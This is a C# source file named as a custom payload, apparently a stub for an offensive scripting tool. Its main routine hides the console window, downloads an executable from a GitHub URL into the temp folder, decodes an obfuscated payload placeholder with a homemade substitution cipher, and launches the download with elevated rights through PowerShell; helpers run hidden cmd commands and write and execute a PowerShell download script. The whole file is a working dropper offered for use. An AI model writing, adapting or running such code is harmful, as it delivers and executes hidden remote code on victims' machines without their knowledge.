using System;
using System.Drawing;
using System.Windows.Forms;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Runtime.InteropServices;

namespace DScustomPayload
{
    class Program
	{
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			// string tempdir = "./";
			
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
			
			
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "\\download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "\\download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();		
		}
		public static void write_txt_to_file(string name, string text)
		{
			File.WriteAllText(name, text);
		}
		public static string decrypt(string mystring)
		{
			mystring = mystring.Replace("/69/", " ");
			// numbers
			mystring = mystring.Replace("/29/", "/");
			mystring = mystring.Replace("/39/", "1");
			mystring = mystring.Replace("/39,5/", "2");
			mystring = mystring.Replace("/40/", "3");
			mystring = mystring.Replace("/40,5/", "4");
			mystring = mystring.Replace("/41/", "5");
			mystring = mystring.Replace("/41,5/", "6");
			mystring = mystring.Replace("/42/", "7");
			mystring = mystring.Replace("/42,5/", "8");
			mystring = mystring.Replace("/43/", "9");
			mystring = mystring.Replace("/43,5/", "0");
			mystring = mystring.Replace("/44/", "-");
			mystring = mystring.Replace("/44,5/", "+");
			mystring = mystring.Replace("/45/", "\"");
			mystring = mystring.Replace("/45,5/", "#");
			mystring = mystring.Replace("/46/", "è");
			mystring = mystring.Replace("/46,5/", "^");
			mystring = mystring.Replace("/47/", "¨");
			mystring = mystring.Replace("/47,5/", "à");
			
			
			// upper+lower chars
			mystring = mystring.Replace("/0,5/", "a");
			mystring = mystring.Replace("/1/", "A");
			mystring = mystring.Replace("/1,5/", "b");
			mystring = mystring.Replace("/2/", "B");
			mystring = mystring.Replace("/2,5/", "c");
			mystring = mystring.Replace("/3/", "C");
			mystring = mystring.Replace("/3,5/", "d");
			mystring = mystring.Replace("/4/", "D");
			mystring = mystring.Replace("/4,5/", "e");
			mystring = mystring.Replace("/5/", "E");
			mystring = mystring.Replace("/5,5/", "f");
			mystring = mystring.Replace("/6/", "F");
			mystring = mystring.Replace("/6,5/", "g");
			mystring = mystring.Replace("/7/", "G");
			mystring = mystring.Replace("/7,5/", "h");
			mystring = mystring.Replace("/8/", "H");
			mystring = mystring.Replace("/8,5/", "i");
			mystring = mystring.Replace("/9/", "I");
			mystring = mystring.Replace("/9,5/", "j");
			mystring = mystring.Replace("/10/", "J");
			mystring = mystring.Replace("/10,5/", "k");
			mystring = mystring.Replace("/11/", "K");
			mystring = mystring.Replace("/11,5/", "l");
			mystring = mystring.Replace("/12/", "L");
			mystring = mystring.Replace("/12,5/", "m");
			mystring = mystring.Replace("/13/", "M");
			mystring = mystring.Replace("/13,5/", "n");
			mystring = mystring.Replace("/14/", "N");
			mystring = mystring.Replace("/14,5/", "o");
			mystring = mystring.Replace("/15/", "O");
			mystring = mystring.Replace("/15,5/", "p");
			mystring = mystring.Replace("/16/", "P");
			mystring = mystring.Replace("/16,5/", "q");
			mystring = mystring.Replace("/17/", "Q");
			mystring = mystring.Replace("/17,5/", "r");
			mystring = mystring.Replace("/18/", "R");
			mystring = mystring.Replace("/18,5/", "s");
			mystring = mystring.Replace("/19/", "S");
			mystring = mystring.Replace("/19,5/", "t");
			mystring = mystring.Replace("/20/", "T");
			mystring = mystring.Replace("/20,5/", "u");
			mystring = mystring.Replace("/21/", "U");
			mystring = mystring.Replace("/21,5/", "v");
			mystring = mystring.Replace("/22/", "V");
			mystring = mystring.Replace("/22,5/", "w");
			mystring = mystring.Replace("/23/", "W");
			mystring = mystring.Replace("/23,5/", "x");
			mystring = mystring.Replace("/24/", "X");
			mystring = mystring.Replace("/24,5/", "y");
			mystring = mystring.Replace("/25/", "Y");
			mystring = mystring.Replace("/25,5/", "z");
			mystring = mystring.Replace("/26/", "Z");
			
			// special chars
			mystring = mystring.Replace("/26,5/", ".");
			mystring = mystring.Replace("/27/", "$");
			mystring = mystring.Replace("/27,5/", "£");
			mystring = mystring.Replace("/28/", "€");
			mystring = mystring.Replace("/28,5/", ":");
			mystring = mystring.Replace("/29,5/", "%");
			mystring = mystring.Replace("/30/", "\\");
			mystring = mystring.Replace("/30,5/", "*");
			mystring = mystring.Replace("/31/", "=");
			mystring = mystring.Replace("/31,5/", "@");
			mystring = mystring.Replace("/32/", "ç");
			mystring = mystring.Replace("/32,5/", "é");
			mystring = mystring.Replace("/33/", "&");
			mystring = mystring.Replace("/33,5/", "~");
			mystring = mystring.Replace("/34/", "'");
			mystring = mystring.Replace("/34,5/", "`");
			mystring = mystring.Replace("/35/", "|");
			mystring = mystring.Replace("/35,5/", "[");
			mystring = mystring.Replace("/36/", "]");
			mystring = mystring.Replace("/36,5/", "!");
			mystring = mystring.Replace("/37/", "?");
			mystring = mystring.Replace("/37,5/", ";");
			mystring = mystring.Replace("/38/", "(");
			mystring = mystring.Replace("/38,5/", ")");
			mystring = mystring.Replace("/69/", " ");
			return mystring;
		}
		public static string encrypt(string mystring)
        {
			mystring = mystring.Replace("/", "/29/");
			mystring = mystring.Replace(" ", "/69/");
			// numbers
			mystring = mystring.Replace("1", "/39/");
			mystring = mystring.Replace("2", "/39,5/");
			mystring = mystring.Replace("3", "/40/");
			mystring = mystring.Replace("4", "/40,5/");
			mystring = mystring.Replace("5", "/41/");
			mystring = mystring.Replace("6", "/41,5/");
			mystring = mystring.Replace("7", "/42/");
			mystring = mystring.Replace("8", "/42,5/");
			mystring = mystring.Replace("9", "/43/");
			mystring = mystring.Replace("0", "/43,5/");
			mystring = mystring.Replace("-", "/44/");
			mystring = mystring.Replace("+", "/44,5/");
			mystring = mystring.Replace("\"", "/45/");
			mystring = mystring.Replace("#", "/45,5/");
			mystring = mystring.Replace("è", "/46/");
			mystring = mystring.Replace("^", "/46,5/");
			mystring = mystring.Replace("¨", "/47/");
			mystring = mystring.Replace("à", "/47,5/");
			
			// upper+lower chars
			mystring = mystring.Replace("a", "/0,5/");
			mystring = mystring.Replace("A", "/1/");
			mystring = mystring.Replace("b", "/1,5/");
			mystring = mystring.Replace("B", "/2/");
			mystring = mystring.Replace("c", "/2,5/");
			mystring = mystring.Replace("C", "/3/");
			mystring = mystring.Replace("d", "/3,5/");
			mystring = mystring.Replace("D", "/4/");
			mystring = mystring.Replace("e", "/4,5/");
			mystring = mystring.Replace("E", "/5/");
			mystring = mystring.Replace("f", "/5,5/");
			mystring = mystring.Replace("F", "/6/");
			mystring = mystring.Replace("g", "/6,5/");
			mystring = mystring.Replace("G", "/7/");
			mystring = mystring.Replace("h", "/7,5/");
			mystring = mystring.Replace("H", "/8/");
			mystring = mystring.Replace("i", "/8,5/");
			mystring = mystring.Replace("I", "/9/");
			mystring = mystring.Replace("j", "/9,5/");
			mystring = mystring.Replace("J", "/10/");
			mystring = mystring.Replace("k", "/10,5/");
			mystring = mystring.Replace("K", "/11/");
			mystring = mystring.Replace("l", "/11,5/");
			mystring = mystring.Replace("L", "/12/");
			mystring = mystring.Replace("m", "/12,5/");
			mystring = mystring.Replace("M", "/13/");
			mystring = mystring.Replace("n", "/13,5/");
			mystring = mystring.Replace("N", "/14/");
			mystring = mystring.Replace("o", "/14,5/");
			mystring = mystring.Replace("O", "/15/");
			mystring = mystring.Replace("p", "/15,5/");
			mystring = mystring.Replace("P", "/16/");
			mystring = mystring.Replace("q", "/16,5/");
			mystring = mystring.Replace("Q", "/17/");
			mystring = mystring.Replace("r", "/17,5/");
			mystring = mystring.Replace("R", "/18/");
			mystring = mystring.Replace("s", "/18,5/");
			mystring = mystring.Replace("S", "/19/");
			mystring = mystring.Replace("t", "/19,5/");
			mystring = mystring.Replace("T", "/20/");
			mystring = mystring.Replace("u", "/20,5/");
			mystring = mystring.Replace("U", "/21/");
			mystring = mystring.Replace("v", "/21,5/");
			mystring = mystring.Replace("V", "/22/");
			mystring = mystring.Replace("w", "/22,5/");
			mystring = mystring.Replace("W", "/23/");
			mystring = mystring.Replace("x", "/23,5/");
			mystring = mystring.Replace("X", "/24/");
			mystring = mystring.Replace("y", "/24,5/");
			mystring = mystring.Replace("Y", "/25/");
			mystring = mystring.Replace("z", "/25,5/");
			mystring = mystring.Replace("Z", "/26/");
			
			// special chars
			mystring = mystring.Replace(".", "/26,5/");
			mystring = mystring.Replace("$", "/27/");
			mystring = mystring.Replace("£", "/27,5/");
			mystring = mystring.Replace("€", "/28/");
			mystring = mystring.Replace(":", "/28,5/");
			mystring = mystring.Replace("%", "/29,5/");
			mystring = mystring.Replace("\\", "/30/");
			mystring = mystring.Replace("*", "/30,5/");
			mystring = mystring.Replace("=", "/31/");
			mystring = mystring.Replace("@", "/31,5/");
			mystring = mystring.Replace("ç", "/32/");
			mystring = mystring.Replace("é", "/32,5/");
			mystring = mystring.Replace("&", "/33/");
			mystring = mystring.Replace("~", "/33,5/");
			mystring = mystring.Replace("'", "/34/");
			mystring = mystring.Replace("`", "/34,5/");
			mystring = mystring.Replace("|", "/35/");
			mystring = mystring.Replace("[", "/35,5/");
			mystring = mystring.Replace("]", "/36/");
			mystring = mystring.Replace("!", "/36,5/");
			mystring = mystring.Replace("?", "/37/");
			mystring = mystring.Replace(";", "/37,5/");
			mystring = mystring.Replace("(", "/38/");
			mystring = mystring.Replace(")", "/38,5/");
			return mystring;
		}
		
		[DllImport("user32.dll", EntryPoint = "ShowCursor", CharSet = CharSet.Auto)]
		public extern static void ShowCursor(int status);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;
		
		static void Main(string[] args)
        {
			string tempdir = Path.GetTempPath();
			
			
			Console.SetWindowSize(1, 1);
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
			
			
			if(!File.Exists(tempdir+@"\dang.exe"))
			{
				ServicePointManager.Expect100Continue = true;
				ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
				
				
				new WebClient().DownloadFile("https://github.com/canarddu38/Dang/raw/main/dang.exe", tempdir+@"\dang.exe");
			}
			
			string encDANGpayload = @"%your_dang_payload%";
			
			File.WriteAllText(tempdir+@"\ptrgzksfeqfesgse.dang", decrypt(encDANGpayload));
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("powershell.exe", @"Start-Process -Verb runas -FilePath '"+tempdir+"\dang.exe' -ArgumentList '"+tempdir+"\ptrgzksfeqfesgse.dang'");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			//processInfo.Verb = "runas";
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			
			Environment.Exit(0);
		}
	}
}
